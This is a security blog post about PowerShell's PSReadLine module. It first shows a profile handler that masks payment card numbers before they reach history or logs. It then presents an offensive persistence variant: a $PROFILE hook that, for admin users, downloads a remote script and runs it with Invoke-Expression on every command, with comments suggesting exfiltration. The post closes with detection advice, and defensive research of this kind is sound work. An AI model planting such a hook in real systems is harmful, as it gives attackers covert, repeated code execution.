## Playing with PSReadLine: Masking data in realtime? What about persistence?

- [Intro](#intro)
- [What's the issue with PAN](#whats-the-issue-with-pan)
- [Back to PSReadLine](#back-to-psreadline)
- [Wait a minute](#wait-a-minute)
- [Mothing new under the sun](#mothing-new-under-the-sun)

### Intro

I have been using the Windows' Terminal since the first announcement. I was impressed with the abilities added via [PSReadLine](https://github.com/PowerShell/PSReadLine) module thanks to amazing [Scott Hanselman](https://www.hanselman.com/blog/you-should-be-customizing-your-powershell-prompt-with-psreadline). I was playing with it this weekend because I was bored.

### What's the issue with PAN

Since I work in payments sector, PAN is the most commonly used [TLA](https://en.wikipedia.org/wiki/Three-letter_acronym) daily. A [PAN](https://en.wikipedia.org/wiki/Payment_card_number) means primary account number, sometimes called payment card number. Here we are sticking to [PCI SSC glossary](https://www.pcisecuritystandards.org/glossary/#glossary-p) and use PAN to refer to *unique payment card number (credit, debit, or prepaid cards, etc.) that identifies the issuer and the cardholder account*. In CTI feeds, news, Twitter or Mastodon posts you hear that another "millions of credit card numbers are stolen and being sold on dark web". The credit card number mentioned there is the PAN we are talking about. So I believe we are on the same page now.

This information is the means to the end: profit. For merchants, it is one way of getting paid, and for payment processors[^1] it is THE way of getting paid. So for some people, working with thousands of PAN daily is just business as usual. They can be working in fraud, charge back, or customer services, and it is their part of job to use these numbers. Of course, it is better not to keep this data at all so that you cannot leak. that's smart, right?

<img src="/assets/smart.png" width="400" alt="Right?">

But since this data must be kept somewhere for transactions, processed and transmitted, some people have to touch this risky data. It should be contained, isolated, and processed securely. A leak may be a huge issue. Not only conractual clauses, but also PCI DSS isues, GDPR fines, and much more. So PAN should be handled properly.

<img src="/assets/simpsons.gif" width="400" alt="PAN is similar to Uranium pieces in Homer Simpson's hands">

As a law-abiding citizen, I am also obeying the [Law of the instrument](https://en.wikipedia.org/wiki/Law_of_the_instrument), and I see PAN everywhere. It is possible to detect with DLP but DLP covers specific fields, not everywhere. I try to find scenarios where there is a likelihood of leaking the data acidentally. commandline history *may* be one of those. I hope not but this is life and weird thinds happen. The PAN can end up in history, event logs, in SIEM and log archive, while you are tring to secure the databases.

<img src="/assets/everywhere.jpg" width="400" alt="PANs everywhere">

### Back to PSReadLine

So this weekend I spent an hour just for this simple idea, that is coverin a ver low likelihood scenario. Would it help me? Maybe. Was it fun? Kinda.

Okay, here's the assumption. You are using Windows Terminal and Powershell 7 is your daily driver. Or, you import `PSReadLine` within your PowerShell 5.x profile, the key is the `PSReadLine` module. Just open your profile by `notepad $PROFILE`, or any other editor of preference, and add these lines:

```powershell
# This should be at the beginning of your profile
using namespace System.Management.Automation.Language

# Rest of your profile is here

# Add this to wherever you want afterwards.

# CommandValidationHandler to mask PANs in the command line before execution
Set-PSReadLineOption -CommandValidationHandler {
    param([CommandAst]$CommandAst)

    # Helper function: Detect and mask PANs within text
    function Mask-PANInText {
        param ([string]$text)

        # Internal function to validate using the Luhn algorithm
        function Test-Luhn {
            param ([string]$Number)
            $temp = $Number.ToCharArray()
            $sum = 0
            $alt = $false
            for ($i = $temp.Length - 1; $i -ge 0; $i--) {
               $digit = [int]::Parse($temp[$i])
               if ($alt) {
                   $digit *= 2
                   if ($digit -gt 9) { $digit -= 9 }
               }
               $sum += $digit
               $alt = -not $alt
            }
            return ($sum % 10) -eq 0
        }

        # Regex to find potential PANs in text (13-19 digits with optional spaces/hyphens)
        $pattern = '\b(\d{13,19}|\d{4}(?:[\ |-]?\d{4}){2,4})\b'
        $matches = [regex]::Matches($text, $pattern)

        foreach ($match in $matches) {
            # Standardize the PAN by removing spaces/hyphens
            $cleanedPAN = $match.Value -replace '[\s-]', ''

            # Validate PAN using the Luhn algorithm
            if ($cleanedPAN.Length -ge 13 -and $cleanedPAN.Length -le 19 -and (Test-Luhn -Number $cleanedPAN)) {
                # Mask the PAN by retaining the first 6 and last 4 digits
                $maskedPAN = $cleanedPAN.Substring(0, 6) + ('*' * ($cleanedPAN.Length - 10)) + $cleanedPAN.Substring($cleanedPAN.Length - 4, 4)
                $text = $text -replace [regex]::Escape($match.Value), "$maskedPAN[Auto-masked]"
            }
        }
        return $text
    }

    # Check each command and mask any PANs found
    $commandText = $CommandAst.Extent.Text
    $maskedCommandText = Mask-PANInText -text $commandText

    # If there are any changes, replace the command line text with the masked version
    if ($maskedCommandText -ne $commandText) {
        [Microsoft.PowerShell.PSConsoleReadLine]::Replace(
            $CommandAst.Extent.StartOffset,
            $CommandAst.Extent.EndOffset - $CommandAst.Extent.StartOffset,
            $maskedCommandText
        )
    }

    # Always return $true to accept the command for execution
    return $true
}

# Set up to validate and accept line when hitting Enter
Set-PSReadLineKeyHandler -Chord Enter -Function ValidateAndAcceptLine
```

As you guessed correctly, we check every single line, and if there is a PAN, we mask it when you hit Enter, so that it will not arrive to any logs, history and such. This is is one way you can use PsReadLine handlers. It is not very creative, but it is an example to show what you can do.

<img src="/assets/Animation-masking.gif" width="800" alt="Masking works as expected">

### Wait a minute

I did this for fun based on a compliance and security scenario but you can use it for any other purpose. If you are trying your offensive options?

```powershell
# This should be at the beginning of your profile
# If you are not going to access [CommanAst] type, you don't need this line.
using namespace System.Management.Automation.Language

# Rest of your profile is here

# Add this to wherever you want afterwards.

# CommandValidationHandler as a persistence mechanism
Set-PSReadLineOption -CommandValidationHandler {
    param([CommandAst]$CommandAst)

    # Return if not admin
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    If  (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Output 'Admin'
        return $true
    }
    $command = (Invoke-WebRequest -Uri "https://gist.githubusercontent.com/zbalkan/f5fe8258ed64da84bce254c9bab6ccfa/raw/6f30364d8f58f02db7f6ff37f02b6a0873956ba7/PsReadLineTest.ps1").Content
    $Command
    Invoke-Expression -Command $command -Verbose
    # Read each line if you need
    # $commandText = $CommandAst.Extent.Text

    # Do your trick here. Exfiltrate data or run commands as admin.

    # you can replace the line as I did with masking
    # $newCommand = 'Whatever you want'
    # [Microsoft.PowerShell.PSConsoleReadLine]::Replace(
    #         $CommandAst.Extent.StartOffset,
    #         $CommandAst.Extent.EndOffset - $CommandAst.Extent.StartOffset,
    #         $newCommand
    # )

    # Always return $true to accept the command for execution
    return $true
}

# Set up to validate and accept line when hitting Enter
Set-PSReadLineKeyHandler -Chord Enter -Function ValidateAndAcceptLine
```

Well, we know that [PowerShell Profile modification](https://attack.mitre.org/techniques/T1546/013/) is a good mechanism for persistence. This is just another way of using it. It is similar to creating subscriptions, but instead of [WMI Event Subscription](https://attack.mitre.org/techniques/T1546/003/) technique, you can utilize this simple, but shiny PowerShell module that comes by default in Windows 10 and PowerShell 6+. The important points to discuss are below:

1. **Detection:** You can query WMI subscriptions for detection. To detect these, you need to compare the `Get-PSReadLineKeyHandler` results, which is possible not a feasible option. You can see that `AcceptLine` is replaced with `ValidateandAcceptLine`, that shows you have some things changed. In the end, you **must** monitor `$PROFILE` paths. <br><img src="/assets/Animation-persistence.gif" width="800" alt="No changes.">
2. **No external persistence mechanism:** We are back into `T1546.013`-only because PSReadLine is stateless, and the parameters must be provided within the `$PROFILE`. So it is less powerful than the combination of `T1546.013` and `T1546.003`.
3. **Runs on every command:** Instead of running once when a new session starts, this runs on every time you hit enter and the line was not empty. So, it is not good for one time tasks. But may be good for exfil. Who knows?

### Mothing new under the sun

In sum, it is not a new trick. It is same old `T1546.013` and even `PsReadLine` isn't new for [security folk](https://github.com/search?q=repo%3ASigmaHQ%2Fsigma%20psreadline&type=code). There are some prerequisites as well. First, the attacker needs to update the `$PROFILE`. So you probably have detections for it. Right?

<img src="/assets/right.jpg" width="400" alt="Right?">

Second, the user must be using PSReadLine. Luckily most sysadmins stick to PowerShell 5.x instead of 6+, due to internal changes of PowerShell cmdlets, such as `Get-WmiObject` vs `Get-CimInstance`[^2].

<img src="/assets/doesnt work.png" width="600" alt="Sometimes it just does not work, I guess">

Since this can escape any logging attempts, it is hard to detect if `$PROFILE` tampering detections are not in place. So, review to you FIM or Sysmon configuration to ensure you are getting alerted on `$PROFILE` modifications.

On the other hand, you can use this for your daily use as well. Please see [the docs](https://learn.microsoft.com/en-us/powershell/module/psreadline/set-psreadlineoption?view=powershell-7.4) for better examples, better than mine.

[^1]: Payment processor may be a bank, or a third party that banks outsource the payment processing job. That's why I did not say banks. Banks as both issuers and acquirers have their position but let's not get into this part.
[^2]: While Github repositories do not reflect the dumpster of powershell script directories sysadmins piled up year by year, successor is getting closer for the open source/source available resources:
<img src="/assets/getwmiobject.png" width="400" alt="Get-WmiObject search results in Github">
<img src="/assets/getciministance.png" width="400" alt="Get-CimInstance search results in Github">
